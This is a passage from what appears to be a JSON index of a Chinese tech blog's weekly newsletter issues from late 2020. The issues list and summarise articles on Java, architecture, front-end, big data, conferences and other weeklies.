Visual Dialogue-commentCZ》被国际多媒体领域顶级会议ACMMM 2020录用。\n\n## 近期会议\n\n### [IBM 数据与 AI 线上论坛](https://ibm.6connex.com/event/chinacenter/DAVF/login)\n\n报名链接：https://ibm.6connex.com/event/chinacenter/DAVF/login\n\n如果将AI在企业的落地与扩展过程视为一场“障碍跑”，那么AI技能的缺乏、AI的可信性、数据的复杂性即是横亘途中的三大障碍。这个夏天开始，IBM将为您诚意打造”数有价，AI无界 | IBM数据与AI线上论坛”，三大专场为您逐一击破三大障碍，加速将AI愿景落地为现实！全球视角与本地洞察紧密结合，一次注册，畅享三大主题专场，全力助您冲刺AI落地与规模化之旅！\n\n■ 10月21日：掘金复杂数据，让数据为业务所用专场（待开放）\n   您的数据为AI做好准备了吗?\n   一起实现数据的轻松获取与组织，确保数据简单、可访问且为业务就绪。\n \n10月21日， “掘金复杂数据，让数据为业务所用专场”即将开场，精彩抢鲜放送：\n\n### [CNCC 2020 中国计算机大会](https://conf.ccf.org.cn/)\n\nCNCC是由CCF主办的计算领域年度盛会，创建于2003年，是CCF旗舰会议，每年于不同城市举办，已成功举办十六届。每年金秋10月，IT专业人士相约CNCC；每届CNCC，都成为学术界、产业界群贤毕至的盛会。\n\nCNCC是宏观论述技术趋势的大会，具有规格高、规模大、内容丰富的特点，会议形式包括大会特邀报告、大会论坛、技术论坛、特色活动及展览。为期三天的大会汇聚了图灵奖获得者、两院院士、国内外顶尖学者、知名企业家等亲临大会，展望前沿趋势，分享创新成果。CNCC得到了国际计算机界的高度关注，ACM 、IEEE CS、日本情报处理学会、韩国信息科学学会等国际计算机组织的高层人士都专程来华参加这一盛会。\n\nCNCC不仅是交流前沿新知的讲坛，更是表彰杰出、分享成功的殿堂大会期间将揭晓CCF王选奖、CCF科学技术奖、CCF海外杰出贡献奖等重要奖项。近百名CCF优秀大学生奖获奖者也在会议期间接受表彰。同期举办的科技成果展和专业参观，为产学研搭建了交流、合作的平台。CNCC是一个开放式平台，除了大会特邀报告和专题论坛外，大会还提供场地，供参会者自发组织各种活动。\n\nCNCC还引起了社会各界的广泛关注。新华社、CCTV、新浪网、人民网等知名媒体均在第一时间报道大会盛况。CCF也通过视频直播、微信微博、专题网站等，让更多人远程参加大会，分享最新趋势。\n\nCCF每年资助近200名师生参加CNCC，让边远地区和经费缺乏单位的师生也有机会参加这一盛会，充分体现了CCF强烈的社会责任感。不断提升的影响力，不断刷新的参会人数，日趋丰富的精彩内容，种类繁多的参与形式，书写着CNCC探索新知、搭建平台的崇高理念，诠释着 CCF“计算技术改变人类生活”的执着追求。\n\n\n### [2020科大讯飞全球开发者大会](https://1024.iflytek.com/)\n\n报名链接：https://1024.iflytek.com/\n\n![2020科大讯飞全球开发者大会](https://up-img.yonghong.tech/pic/2020/10/13-17-46-%E6%88%AA%E5%B1%8F2020-10-13%20%E4%B8%8B%E5%8D%885.46.37-XtozZN.png)\n\n科大讯飞全球1024开发者节是以AI开发者为受众群体的人工智能盛会，由科大讯飞发起并主办。选择在每年的10月24日，是因为在计算机世界中，1024是2的十次方，是二进制计数的基本计量单位之一，是1KB的字节数，因此组成了程序中的最基础基因序列。从事计算机工作的开发者就像一个个1024，以最具创新、最富热情的基础模块搭建起整个万物互联世界。 秉承“开放·合作·生态·共享”的理念，科大讯飞全球1024开发者节希望用最新最全的人工智能技术和产品促进跨行业链接、多领域碰撞、新技术开发，以科技之光、生态之念，立足当下、放眼未来。\n\n### [2020 MongoDB 中国线上用户大会](https://www.mongodb.com/live-china-zh)\n\n会议时间：11 月 24 日 星期二\n\n报名链接：https://www.mongodb.com/live-china-zh\n\n线上参会，全天精彩享不停！MongoDB重磅嘉宾主题演讲、头部客户使用心得分享、干货满满的多个分会场、动手实操培训，MongoDB 只为助您轻松构建可扩展、高性能、现代化应用程序。\n\n## 其他周报\n\n- [科技爱好者周刊（第 129 期）：创业的凸函数和凹函数](https://github.com/ruanyf/weekly/blob/master/docs/issue-129.md)\n\n- [Go语言爱好者周刊：第 65 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-065.md)\n\n- [2020.10.12 - The Widening Responsibility for Front-End Developers](https://github.com/zenany/weekly/blob/master/software/2020/1012.md)\n\n- [老司机 iOS 周报 #132 | 2020-10-19](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23132-2020.10.19.md)\n\n- [R Weekly 2020-41 package development topics, contributing to rOpenSci, learnr and shiny](https://rweekly.org/2020-41.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第4期 | 2020年10月26日","url":"//weekly-004/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n\n- [基本功 | Java即时编译器原理解析及实践](https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html)\n跟其他常见的编程语言不同，Java将编译过程分成了两个部分，这就对性能带来了一定的影响。而即时（Just In Time, JIT）编译器能够提高Java程序的运行速度。本文会先解析一下即时编译器的原理，然后再分享一些在美团实践的经验，希望能对大家有所帮助或者启发。\n\n<!-- more -->\n## 架构\n\n- [有赞保理业务架构设计与实践](https://tech.youzan.com/you-zan-bao-li-ye-wu-jia-gou-she-ji-yu-shi-jian/)\n为保障消费者权益，有赞提供基础消费保障服务。买家确认收货后，资金才可结算到卖家店铺余额，普遍的结算周期在7天左右。从商家的角度出发，结算账期的产生使得资金周转变慢，这为扩大生产交易规模制造了困难。于是快速回款产品应运而生，有赞通过引入保理机构，以应收账款保理转让的模式来帮助商家实现资金快速回笼。\n- [低代码在爱奇艺鹊桥数据同步平台的实践](https://mp.weixin.qq.com/s/IfYG7TgFK0rRN70cvIoPrQ)\n本文结合爱奇艺App后端在业务数据同步方面的实践，分享基于低代码平台高效交付业务需求及避免重复开发的经验。\n- [软件开发必修课：你该知道的GRASP职责分配模式](https://mp.weixin.qq.com/s/IaxAnWfVqe3mM0bHFVV5Gg)\n阿里妹导读：软件开发为什么需要职责驱动设计（RDD）？职责应该如何分配？如何结合架构模式在实际开发中实践落地？本文介绍一种通用的职责分配模式——GRASP，通过举例详解GRASP的几大原则，并分享两个实际运用的案例。\n\n## 近期会议\n\n### [携程技术沙龙——大数据与AI技术实践](https://mp.weixin.qq.com/s/DCTALw91IDgykewyoGJk2Q)\n\n报名链接：https://mp.weixin.qq.com/s/DCTALw91IDgykewyoGJk2Q\n\n- 10月27日 19:00-20:00 Trip全球化指标平台建设 协程曾荣军\n- 11月3日 19:00-20:00 大数据离在线混合部署技术方案 腾讯高廉墀\n- 11月10日 19:00-20:00 携程机器翻译技术 携程余谦\n- 11月17日 19:00-20:00 智能写稿技术在58部落内容社区的应用实践 58同城李忠\n\n### [2020 MongoDB 中国线上用户大会](https://www.mongodb.com/live-china-zh)\n\n会议时间：11 月 24 日 星期二\n\n报名链接：https://www.mongodb.com/live-china-zh\n\n线上参会，全天精彩享不停！MongoDB重磅嘉宾主题演讲、头部客户使用心得分享、干货满满的多个分会场、动手实操培训，MongoDB 只为助您轻松构建可扩展、高性能、现代化应用程序。\n\n## 其他周报\n\n- [科技爱好者周刊（第 130 期）：低龄化的互联网](https://github.com/ruanyf/weekly/blob/master/docs/issue-130.md)\n\n- [Go语言爱好者周刊：第 66 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-066.md)\n\n- [2020.10.19 - The Developer Experience Gap](https://github.com/zenany/weekly/blob/master/software/2020/1019.md)\n\n- [老司机 iOS 周报 #133 | 2020-10-26](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23133-2020.10.26.md)\n\n- [R Weekly 2020-42 Climate animation, NNMF in soccer, and Raspberry Pi with R](https://rweekly.org/2020-42.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊","即时编译","数据同步","平台架构","有赞","RDD","架构","设计模式"]},{"title":"技术爱好者周刊 第5期 | 2020年11月02日","url":"//weekly-005/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [你不知道的JMM底层原理](https://segmentfault.com/a/1190000037662046)\n在多线程并发的世界里synchronized、volatile、JMM是我们绕不过去的技术坎，而重排序、可见性、内存屏障又有时候搞得你一脸懵逼。有道是知其然知其所以然，了解了底层的原理性问题，不论是日常写BUG还是面试都是必备神器了。\n\n## 前端\n- [Native地图与Web融合技术的应用与实践](https://tech.meituan.com/2020/10/30/native-web-pratice-in-meituan.html)\n本文将WebView与Native地图组件叠加到一起，实现了用户手势事件智能分发的机制，解决了WebView与Native地图在同一页面内布局困难的问题。\n- [波塞冬：伴鱼运营活动前端配置化实践](https://tech.ipalfish.com/blog/2020/10/26/poseidon/)\n波塞冬，是伴鱼活动运营解决方案的总称，包含活动规则体系、h5 可视化开发平台等，名称来源于古希腊神话，波塞冬是海洋和所有水系的管理者，寓意为 palfish 发展提供超能力。\n- [干货 | 深入浅出Apple响应式框架Combine](https://mp.weixin.qq.com/s/8LErZWJ0F0VsZ7WgjCb-Vg)\nCombine.framework 是Apple在2019 WWDC 上基于Swift推出的函数响应框架（Functional Reactive Programming）,支持Apple全平台的操作系统（iOS13+，macOS 10.15+等）。函数式响应框架无论在哪个平台早已流行泛滥，开源的Rx更是实现了各种语言的响应式编程框架。Apple在这个时候推出响应式框架，无疑是对自己护城河的进一步巩固。事实上SwiftUI的数据驱动就是依赖Combine。本文将深入浅出地介绍Combine的基本概念和原理，然后通过具体demo详细阐述其在实际编码中的应用。\n<!-- more -->\n\n## 近期会议\n\n### [2020 MongoDB 中国线上用户大会](https://www.mongodb.com/live-china-zh)\n\n会议时间：11 月 24 日 星期二\n\n报名链接：https://www.mongodb.com/live-china-zh\n\n线上参会，全天精彩享不停！MongoDB重磅嘉宾主题演讲、头部客户使用心得分享、干货满满的多个分会场、动手实操培训，MongoDB 只为助您轻松构建可扩展、高性能、现代化应用程序。\n\n## 其他周报\n\n- [科技爱好者周刊（第 131 期）：你的头脑是二值逻辑，还是三值逻辑？](https://github.com/ruanyf/weekly/blob/master/docs/issue-131.md)\n\n- [Go语言爱好者周刊：第 67 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-067.md)\n\n- [2020.10.26 - The Tyranny of Metrics](https://github.com/zenany/weekly/blob/master/software/2020/1026.md)\n\n- [老司机 iOS 周报 #134 | 2020-11-02](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23134-2020.11.02.md)\n\n- [R Weekly 2020-43 Rolling averages with {slider}, mapping as art, and mapping flooding impacts.\n](https://rweekly.org/2020-43.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第6期 | 2020年11月09日","url":"//weekly-006/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [程序员都应该知道的URI，一文帮你全面了解](https://segmentfault.com/a/1190000037763452)\nURI 是每个程序员都应该了解的概念，同时相关联的还有 URL, URN 等概念簇。了解这些概念，可以帮助我们更好地窥探万维网(WWW)的设计，同时也能帮我们在工作中有效解决跟 URI 相关概念的问题，更加理解 encode,decode 工作原理，更好地助力网络编程！\n- [5G时代|淘宝直播高画质低延时技术探索](https://juejin.cn/post/6891582162798116871)\n5G将对视频分辨率和清晰度提出越来越高的要求。淘宝作为一个数亿级用户的短视频与直播平台，业务多样，两端用户分布广，设备和网络情况复杂，给多媒体内容存储和分发带来巨大挑战。在内容生产过程中把控好质量和成本，在内容分发和消费过程中确保用户体验，是当前面临的主要问题。为了解决这个问题，我们有两个优化目标，一是在画质不变的前提下降码率，二是在码率不变的前提下提升画面质量。\n- [干货 | 携程Elasticsearch数据同步实践](https://mp.weixin.qq.com/s/2PRX_vVhi3SygrZydBfG6w)\nElasticsearch是最近几年非常热门的分布式搜索和数据分析引擎，携程内部不仅使用ES实现了大规模的日志平台，也广泛使用ES实现了各个业务场景的搜索、推荐等功能。本文聚焦在业务搜索的场景分享了我们在做数据同步方面的思考和实践，希望能对大家有所启发。\n\n\n<!-- more -->\n\n## 前端\n- [积木Sketch插件进阶开发指南](https://tech.meituan.com/2020/11/05/native-web-pratice-in-meituan.html)\n积木插件原本只是外卖提升UI/RD协作效率的一次尝试，最初的目标仅是UI一致性，但是现在已经作为全面提升产研效率的媒介，承载了越来越多的功能。 \n\n## 工具\n- [优秀 ！华为是这样使用Git rebase的](https://segmentfault.com/a/1190000037696764)\n理论上来说，只要能合理管理项目分支，这几个命令已经足以应付所有的日常开发工作。但是如果我们偶尔看一下自己的git graph，我的天呐，为什么会这么乱。鉴于分支管理的混乱（或者根本就没有进行过分支管理），我们经常遇到一些意想不到的问题，因此需要使用很多面生的git命令来解决我们的问题，比如说本文讲到的git rebase。\n- [你真的会使用搜索引擎吗？](https://blog.authing.cn/blog/detail/87)\n相信很多人平时打开网页，想要搜索东西的时候，都会直接选择输入关键词，于是得到一大堆种类不一的搜索结果，在茫茫页面中苦苦寻找自己需要的信息。这种不经思考的搜索方式，不仅增加了搜索信息的时间成本，还往往找不到正确的信息。那么，正确的搜索方式是什么呢？本文结合了作者多年的搜索经验和实践，包教包会，让你从只会简单搜索关键词的小白瞬间成长为掌握多种搜索技巧的高手，下面便开始学习吧\n\n\n\n## 近期会议\n\n### [2020 MongoDB 中国线上用户大会](https://www.mongodb.com/live-china-zh)\n\n会议时间：11 月 24 日 星期二\n\n报名链接：https://www.mongodb.com/live-china-zh\n\n线上参会，全天精彩享不停！MongoDB重磅嘉宾主题演讲、头部客户使用心得分享、干货满满的多个分会场、动手实操培训，MongoDB 只为助您轻松构建可扩展、高性能、现代化应用程序。\n\n## 其他周报\n\n- [科技爱好者周刊（第 132 期）：快能力和慢能力](https://github.com/ruanyf/weekly/blob/master/docs/issue-132.md)\n\n- [Go语言爱好者周刊：第 68 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-068.md)\n\n- [2020.11.02 - If not SPAs, What?](https://github.com/zenany/weekly/blob/master/software/2020/1102.md)\n\n- [老司机 iOS 周报 #135 | 2020-11-09](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23131-2020.11.09.md)\n\n- [R Weekly 2020-44 {emphatic}, American political data, data science teaching](https://rweekly.org/2020-44.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第7期 | 2020年11月16日","url":"//weekly-007/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [Java中9种常见的CMS GC问题分析与解决](https://tech.meituan.com/2020/11/12/java-9-cms-gc.html)\n目前，互联网上 Java 的 GC 资料要么是主要讲解理论，要么就是针对单一场景的 GC 问题进行了剖析，对整个体系总结的资料少之又少。前车之鉴，后事之师，美团的几位工程师搜集了内部各种 GC 问题的分析文章，并结合个人的理解做了一些总结，希望能起到“抛砖引玉”的作用。\n- [Java-Collectors常用的20个方法](https://niocoder.com/2020/11/15/Java-Collectors%E5%B8%B8%E7%94%A8%E7%9A%8420%E4%B8%AA%E6%96%B9%E6%B3%95/)\n- [TDengine + EMQ X + Grafana 轻松搭建高效低成本的边缘侧工业互联网平台](https://www.taosdata.com/blog/2020/11/12/2007.html)\n本文将介绍基于TDengine、EMQ X搭建一个集工业数据采集、汇聚、清洗、存储分析以及可视化展示等能力于一体的轻量级边缘计算工业互联网平台。在此方案基础上，读者可以根据自身需求调整方案设计，从而搭建满足实际业务需求的工业互联网平台，加速实现工业智能化转型。\n- [微服务授权应该怎么做？](https://segmentfault.com/a/1190000037781574)\n前后端鉴权是一个很大的话题，不同组织的鉴权方式各不相同，甚至对同一协议的业务实现也可能相去甚远。本文尝试从认证与授权两个维度来描述标题中的鉴权，大部分篇幅还是偏认证。\n- [分布式系统！如何实现用户追踪和认证？](https://segmentfault.com/a/1190000037785314)\n讲使用 spring security 等具体技术的资料已经很多了，这篇文章不打算写框架和代码的具体实现。我们会讨论认证和授权的区别，然后会介绍一些被业界广泛采用的技术，最后会聊聊怎么为 API 构建选择合适的认证方式。\n- [一例 Go 编译器代码优化 bug 定位和修复解析](https://mp.weixin.qq.com/s/Tyl6dSb7mHBuqqN6WvEuaw)\n本文中介绍了 Go 编译器的整体编译流程脉络和一个编译优化错误导致数据越界访问的 bug，并分析了对这个 bug 的排查和修复过程，希望能够借此让大家对 Go 编译器有更多的了解，在遇到类似问题时有排查思路。\n- [服务注册中心 | 记一次Consul故障分析与优化](https://mp.weixin.qq.com/s/fJ22y7MQvkcNJkiAnMwcUg)\n在微服务体系中，服务注册中心是最基础的组件，它的稳定性会直接影响整个服务体系的稳定性。本文主要介绍了爱奇艺微服务平台基于Consul的服务注册中心建设方式，与内部容器平台、API网关的集成情况，并重点记录了Consul遇到的一次故障，分析解决的过程，以及针对这次故障从架构上的优化调整措施。Consul 是近几年比较流行的服务发现工具，用于实现分布式系统的服务发现与配置。与其它分布式服务注册与发现的方案相比Consul 的方案更“一站式”，使用起来也较 为简单。他的主要应用场景为：服务发现、服务隔离、服务配置。\n\n\n<!-- more -->\n\n## 前端\n- [干货 | 携程移动直播探索](https://mp.weixin.qq.com/s/fZOpnikrrWZYDHc9nIRjWQ)\n直播行业大概在10年前就开始兴起了，秀场直播和游戏直播是pc时代比较成功的应用场景。现阶段，移动互联网的大规模普及，流量价格越来越便宜，移动视频直播异常火爆，随着各行各业的不断融合，直播带货超高的营业额，明星艺人、销售、秀场网红的涌入，直播行业迎来了空前的繁荣发展。从pc直播到渐渐火爆的移动直播，直播技术也在不断地更新迭代，趋于成熟。本文从直播流的选择、交互优化、快速迭代等方面介绍携程直播技术。\n\n## 大数据\n- [【技术猩球】​七牛云内部平台架构 QStreaming——轻量级大数据ETL的开发框架](https://blog.qiniu.com/archives/8938)\nQStreaming is a framework that simplifies writing and executing ETLs on top of Apache Spark. It is based on a simple sql-like configuration file and runs on any Spark cluster\n- [HDFS慢节点监控及处理](https://mp.weixin.qq.com/s/wP8MlQr6Q-Z542YzpBCZEA)\nHDFS集群随着使用时间的增长，难免会出现一些“性能退化”的节点，主要表现为磁盘读写变慢、网络传输变慢，我们统称这些节点为慢节点。当集群扩大到一定规模，比如上千个节点的集群，慢节点通常是不容易被发现的。大多数时候，慢节点都藏匿于众多健康节点中，只有在客户端频繁访问这些有问题的节点，发现读写变慢了，才会被感知到。\n\n## 人工智能\n- [日均5亿字符翻译量，百毫秒内响应，携程机器翻译平台实践](https://tech.ctrip.com/articles/a_ai/11125/)\n随着国际化进程的开展，携程正加速第三次创业，各部门及业务场景对多语种的需求日益增长，依靠译员或精通多语种的客服难以支撑持续扩大的自然文本翻译流量。机器翻译技术作为近年来人工智能领域在自然语言处理任务上探索的先驱，逐渐走出学术的象牙塔，开始为普通用户提供实时便捷的翻译服务，并已取得了显著的成效。在这样的形势下，针对旅游服务场景提供更高质量低成本的机器翻译服务成为了一个重要课题。\n\n## 近期会议\n\n### [2020 MongoDB 中国线上用户大会](https://www.mongodb.com/live-china-zh)\n\n会议时间：11 月 24 日 星期二\n\n报名链接：https://www.mongodb.com/live-china-zh\n\n线上参会，全天精彩享不停！MongoDB重磅嘉宾主题演讲、头部客户使用心得分享、干货满满的多个分会场、动手实操培训，MongoDB 只为助您轻松构建可扩展、高性能、现代化应用程序。\n\n## 其他周报\n\n- [科技爱好者周刊（第 133 期）：贵州变瑞士，有没有可能？](https://github.com/ruanyf/weekly/blob/master/docs/issue-133.md)\n\n- [Go语言爱好者周刊：第 69 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-069.md)\n\n- [2020.11.09 - 7GUIs: A GUI Programming Benchmark](https://github.com/zenany/weekly/blob/master/software/2020/1109.md)\n\n- [老司机 iOS 周报 #136 | 2020-11-16](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23136-2020.11.16.md)\n\n- [R Weekly 2020-45 Publishing, Prefrontal Cortex, Parentheses](https://rweekly.org/2020-45.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第8期 | 2020年11月23日","url":"//weekly-008/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [干货 | 携程 Cilium+BGP 云原生网络实践](https://mp.weixin.qq.com/s/vX30d4sAX2oETnNh3uZlEA)\nCilium 是近两年最火的云原生网络方案之一。Cilium 的核心基于 eBPF，有两大亮点：基于 eBPF 的灵活、高性能网络，以及基于 eBPF 的 L3-L7 安全策略实现。携程 2019 年开始在生产环境使用 Cilium，本文将介绍 Cilium 在携程的落地情况，以及我们基于 Cilium 的、覆盖虚拟机、物理机和容器的云原生安全的一些探索。\n- [数据人的“大考”：AnalyticDB如何强力支撑双11？](https://mp.weixin.qq.com/s/fyndobsiw4E5y_lXkrTBxw)\n每年的双11都是云原生数据仓库AnalyticDB MySQL版（原分析型数据库MySQL版）的一块试金石。今年AnalyticDB除了在阿里数字经济体内进入更多核心交易链路，全力支撑双11以外，AnalyticDB全面拥抱云原生，构建极致弹性，大幅降低成本，释放技术红利，重磅发布了诸多全新企业级特性，让用户及时拥有极高性价比的云原生数据仓库。本文深度解析云原生数据仓库AnalyticDB面临的挑战和最新关键技术，分享双11护航背后的技术实践与经验。\n\n## 前端\n- [双十一SSR优化实践：秒开率提升新高度](https://juejin.cn/post/6896288990765252616)\n会场是每年双十一的主角之一，会场的用户体验自然也是每年最关注的点。在日趋复杂的业务需求下，如何保障我们的用户体验不劣化甚至能更优化是永恒的命题。\n今年（2020）我们在不改变现有架构，不改变业务的前提下，在会场上使用了 SSR 技术，将秒开率提高到了新的高度（82.6%）；也观察到在用户体验得到优化的同时，业务指标如 UV 点击率等也有小幅的增长（视不同业务场景有不同的提升，最大可达 5%），带来了不错的业务价值。\n本文将从服务端、前端两个角度介绍我们在 SSR 上的方案与经验\n1、前端在解决工程化、业务效果评估上的具体实践与方法论\n2、服务端在解决前端模块代码于服务端执行、隔离和性能优化上的具体实践与方法论\n- [爱奇艺知识移动端组件化探索和实践](https://mp.weixin.qq.com/s/DCrixXqnEnuHpYfUPjyACA)\n组件化对于任何一个业务场景复杂的APP以及经过多次迭代之后的产品来说都是必经之路，组件化是指解耦复杂系统时将多个功能模块拆分、重组的过程。组件化要做的不仅仅是表面上看到的模块拆分解耦，其背后还有很多工作来支撑组件化的进行，例如结合业务特性的模块拆分策略、模块间的交互方式和构建系统等等。本文主要讲述爱奇艺知识APP如何结合自身的业务特点，探索和实践了一套高效的移动端组件化方案。\n\n<!-- more -->\n\n## 测试\n- [基于chaosblade的故障注入平台实践](https://mp.weixin.qq.com/s/5e9cmqvvaIhNs8CNVJuNog)\n当今社会互联网应用越来越广泛，用户量日益剧增。在人们对互联网服务的依赖性增大的同时，也对服务的可用性和体验感有了更高的要求。那么如何保障服务在运营过程中能一直给用户提供稳定的、不间断的、可靠可信的服务呢？例如一个金融产品，如果出现过一次问题，那可能带来巨大的损失。大家都知道金融产品的系统架构和服务逻辑是相当复杂的，至此大家都会第一时间联想到测试工程师，他们会通过单元测试、集成测试、性能测试等来验证服务的稳定性。但尽管如此，也是远远不够的，因为错误可以在任何时间以任何形式发生，尤其是对分布式系统。所以这里就需要引入混沌工程（Chaos Engineering）。\n\n## 设计模式\n- [设计模式最佳套路—— 愉快地使用策略模式](https://juejin.cn/post/6897011052601409549)\n策略模式（Strategy Pattern）定义了一组策略，分别在不同类中封装起来，每种策略都可以根据当前场景相互替换，从而使策略的变化可以独立于操作者。比如我们要去某个地方，会根据距离的不同（或者是根据手头经济状况）来选择不同的出行方式（共享单车、坐公交、滴滴打车等等），这些出行方式即不同的策略。\n\n## 大数据\n- [Apache Kylin的实践与优化](https://tech.meituan.com/2020/11/19/apache-kylin-practice-in-meituan.html)\nApache Kylin是一个基于Hadoop大数据平台打造的开源OLAP引擎，它采用了多维立方体预计算技术，利用空间换时间的方法，将查询速度提升至亚秒级别，极大地提高了数据分析的效率，并带来了便捷、灵活的查询功能。\n- [双汇大数据方案选型：从棘手的InfluxDB+Redis到毫秒级查询的TDengine](https://www.taosdata.com/blog/2020/11/17/2028.html)\n双汇发展多个分厂的能源管控大数据系统主要采用两种技术栈：InfluxDB/Redis和Kafka/Redis/HBase/Flink，对于中小型研发团队来讲，无论是系统搭建，还是实施运维都非常棘手。经过对InfluxDB/Redis和TDengine大数据平台的功能和性能对比测试，最终将TDengine作为实施方案。\n\n## 近期会议公开课\n\n### [2020 MongoDB 中国线上用户大会](https://www.mongodb.com/live-china-zh)\n\n会议时间：11 月 24 日 星期二\n\n报名链接：https://www.mongodb.com/live-china-zh\n\n线上参会，全天精彩享不停！MongoDB重磅嘉宾主题演讲、头部客户使用心得分享、干货满满的多个分会场、动手实操培训，MongoDB 只为助您轻松构建可扩展、高性能、现代化应用程序。\n\n### NGINX开源社区技术专题系列课程（安全专题）\n\n报名链接：https://www.nginx.org.cn/article/detail/336\n\n主题：使用ModSecurity/App Protect模块构建NGINX WAF\n\n时间：11月25日下午2-3点\n\n讲师：NGINX解决方案架构师邹俊\n\n\n企业需要迅速将服务和应用推向市场，而快速将代码发布到生产环境中的压力使得安全性很容易下滑。过度依赖诸如漏洞扫描器之类的自动化工具是危险的，因为它们不能捕捉到所有问题。将各种跨功能开发团队提供的代码结合起来，就不太清楚谁负责实施安全性。在生产环境中运行多个应用和应用版本会使应用程序的防护层出现裂缝。\n\n最终的结果是，对web应用防火墙（WAF）等安全工具的需求从未像现在这样迫切。这些安全工具通常与负载平衡代理集成，并部署在公司网络的边缘（或前门）以创建安全的外围环境。\n\n安全不再是CISO和SecOps团队的唯一领域。DevOps团队在接受、测试和部署作为CI/CD管道一部分的安全策略方面扮演着重要角色。NGINX App Protect将F5先进WAF技术的有效性与NGINX的灵活性和性能相结合。它本机运行在NGINX Plus上，以解决现代DevOps环境面临的安全挑战。\n\n通过本次公开课，您可以了解：\n- NGINX WAF使用场景\n- NGINX WAF vs NGINX App Protect\n- NGINX App Protect策略配置\n- KIC WAF策略配置\n\n## 会议公开课资料\n\n### 2020 Google 开发者大会 (Google Developer Summit)\nGoogle 开发者大会 (Google Developer Summit) 是谷歌面向开发者展示最新产品和平台的年度盛会。2020 Google 开发者大会于 11 月 16 日 至 21 日举行，这是谷歌首次以全线上大会的形式与中国开发者相聚。本次大会以“代码不止”为主题，全面介绍了产品更新以及一系列面向本地开发者的技术支持内容，旨在赋能开发者高效创新、持续不断地创造愉悦的产品体验。\n\n2020 Google 开发者大会 (Google Developer Summit) 全部视频 https://www.youtube.com/playlist?list=PLdcOMcDMrLrUmZuXRKtOlhDZGpsvQIXi7\n\n2020 Google 开发者大会 主题演讲 https://youtu.be/5zO60HNQkWQ\n\n2020 Google 开发者大会 技术演讲专场 Android、Google Play、ChromeOS https://youtu.be/N-x7tXYfOxE\n\n2020 Google 开发者大会 技术演讲专场 Flutter、Web、Material Design https://youtu.be/4VLQMySQh8Q\n\n2020 Google 开发者大会 技术演讲专场 TensorFlow、Google 女性开发者职业发展座谈会 https://youtu.be/Nu9zgUI5KTc\n\n2020 Google 开发者大会 技术演讲专场 Google Cloud、Google Assistant、游戏和移动应用、Firebase https://youtu.be/yr8Axaje0C4\n\n2020 Google 开发者大会 技术演讲专场 谷歌艺术与文化、ARCore by Google、WearOS by Google https://youtu.be/xqfpGAW8d_M\n\n## 其他周报\n\n- [科技爱好者周刊（第 134 期）：未来的游戏业比现在大100倍](https://github.com/ruanyf/weekly/blob/master/docs/issue-134.md)\n\n- [Go语言爱好者周刊：第 70 期](https://github.com/polaris1119/golangweekly/blob/master/docs/issue-070.md)\n\n- [2020.11.16 - KISS, SOLID, YAGNI And Other Fun Acronyms](https://github.com/zenany/weekly/blob/master/software/2020/1116.md)\n\n- [老司机 iOS 周报 #137 | 2020-11-23](https://github.com/SwiftOldDriver/iOS-Weekly/blob/master/Reports/2020/%23137-2020.11.23.md)\n\n- [R Weekly 2020-46 Open Acces, YAPOEH, Docker](https://rweekly.org/2020-46.html)\n\n","categories":["技术爱好者周刊"],"tags":["技术爱好者周刊"]},{"title":"技术爱好者周刊 第9期 | 2020年11月30日","url":"//weekly-009/","content":"\n> 技术爱好者周刊，每周一发布，欢迎提[issue](https://github.com/wangyonghong/yonghong-me/issues)贡献内容。\n\n## 后端\n- [Mysql 索引精讲](https://www.cnblogs.com/wyc1994666/p/10831039.html)\n本文主要讲述常见索引类型(实现层面)、索引种类(应用层面)、聚簇索引与非聚簇索引、覆盖索引、最佳索引使用策略。\n- [京东到家MySQL容器化，为何首选Docker而非K8S？](https://mp.weixin.qq.com/s/FTujitwkMl5LRdbWCxOEGA)\n本文根据詹乡泉老师在〖deeplus直播第250期〗线上分享演讲内容整理而成。（文末有获取本期PPT&回放的方式，不要错过），分享视频：https://youtu.be/skZlLhqDUdc\n- [高德最佳实践：Serverless规模化落地有哪些价值？](https://mp.weixin.qq.com/s/Za9eR0tNjoU3rTg5xTYgNA)\n曾经看上去很美、一直被观望的 Serverless，现已逐渐进入落地的阶段。今年的\"十一出行节\"，高德在核心业务规模化落地 Serverless，由 Serverless 支撑的业务在流量高峰期的表现十分优秀。传统应用也能带来同样的体验，那么 Serverless 的差异化价值又是什么呢？本文分享高德 Serverless 规模化落地背后的实践总结。\n- [Elasticsearch 技术分析（九）：全文搜索引擎Elasticsearch，这篇文章给讲透了！](https://www.cnblogs.com/jajian/p/11223992.html)\n本篇主要是基于之前的博文的一个总结，希望通过这篇文章能让读者大致了解Elasticsearch是做什么的以及它的使用和基本原理。\n\n<!-- more -->\n## 前端\n- [Android 